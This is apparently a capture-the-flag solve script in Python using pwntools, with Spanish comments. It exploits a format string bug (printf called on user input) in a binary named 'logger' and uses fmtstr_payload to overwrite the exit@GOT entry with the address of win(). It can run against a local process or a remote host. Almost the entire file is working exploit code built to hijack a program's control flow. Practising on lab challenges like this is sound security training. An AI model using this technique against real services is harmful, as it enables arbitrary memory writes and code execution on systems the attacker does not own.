#!/usr/bin/env python3
"""
Format string arbitrary write — sobrescribe exit@GOT con win().

La vulnerabilidad: printf(log) sin formato.
El objetivo: exit@GOT → win()

Uso:
  python3 solve.py              # local
  python3 solve.py REMOTE <ip> <port>
"""
import sys
from pwn import *

BINARY = './logger'
elf = ELF(BINARY, checksec=False)

WIN      = elf.symbols['win']
EXIT_GOT = elf.got['exit']

print(f'[*] win()    @ {hex(WIN)}')
print(f'[*] exit@GOT @ {hex(EXIT_GOT)}')

if args.REMOTE:
    p = remote(sys.argv[2], int(sys.argv[3]))
else:
    p = process(BINARY)

p.recvuntil(b'log:\n')

# Offset del format string en el stack.
# Para -O0 -no-pie, tipicamente es 6 u 8.
# Ajustar si el exploit no funciona (usar %6$p, %7$p, %8$p para detectar).
OFFSET = 8

payload = fmtstr_payload(OFFSET, {EXIT_GOT: WIN})
p.sendline(payload)
p.interactive()
